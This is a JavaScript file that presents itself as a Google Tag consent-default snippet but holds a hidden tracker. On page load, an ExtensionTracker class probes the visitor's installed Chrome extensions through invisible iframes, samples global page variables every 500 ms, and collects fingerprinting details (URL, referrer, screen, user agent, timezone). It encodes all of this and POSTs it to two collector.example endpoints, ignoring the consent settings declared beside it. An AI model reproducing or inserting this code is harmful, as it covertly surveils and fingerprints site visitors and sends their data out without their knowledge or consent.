window.dataLayer = window.dataLayer || [];
const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
let GlobalVars = []; // Global vars collection

class ExtensionTracker {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 5;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
    this.eventListeners = [];
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
      };
      this.registerEventListener(frame, 'load', () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(this.timeBox);
                cleanup();
                resolve([extName, true]);
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(this.timeBox);
              cleanup();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(this.timeBox);
          cleanup();
          resolve([extName, false]);
        }
      });
      document.body.appendChild(frame);
      this.pendingScans++;
    });
  }
  registerEventListener(element, event, handler) {
    element.addEventListener(event, handler);
    this.eventListeners.push({
      element,
      event,
      handler
    });
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
  }
  generateTelemetryData() {
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      scanDuration: Date.now() - this.startTimestamp,
      events: this.eventListeners.length,
      globalVars: GlobalVars,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionTracker.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionTracker.BATCH_SIZE, (i + 1) * ExtensionTracker.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    await this.reportResults();
  }
}
function gtag() {
  dataLayer.push(arguments);
}
//default behavior
gtag('consent', 'default', {
  'ad_storage': 'granted',
  'analytics_storage': 'granted',
  'wait_for_update': 500
});

//behavior specific for end-users in the EEA

setInterval(() => {
  // JShook sampling global variables
  window.jshook = Object.keys(window).filter(v => v !== 'jshook');
  if (!GlobalVars.length) {
    GlobalVars = window.jshook;
  } else {
    GlobalVars = Array.from(new Set(GlobalVars.concat(window.jshook)));
  }
}, 500);
gtag('consent', 'default', {
  'ad_storage': 'denied',
  'analytics_storage': 'denied',
  'region': ['BE', 'BG', 'CZ', 'DK', 'CY', 'LV', 'LT', 'LU', 'ES', 'FR', 'HR', 'IT', 'PL', 'PT', 'RO', 'SI', 'HU', 'MT', 'NL', 'AT', 'IS', 'LI', 'NO', 'SK', 'FI', 'SE', 'DE', 'EE', 'IE', 'EL'],
  'wait_for_update': 500
});
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionTracker().execute();
  }
});
if (document.body) {
  new ExtensionTracker().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}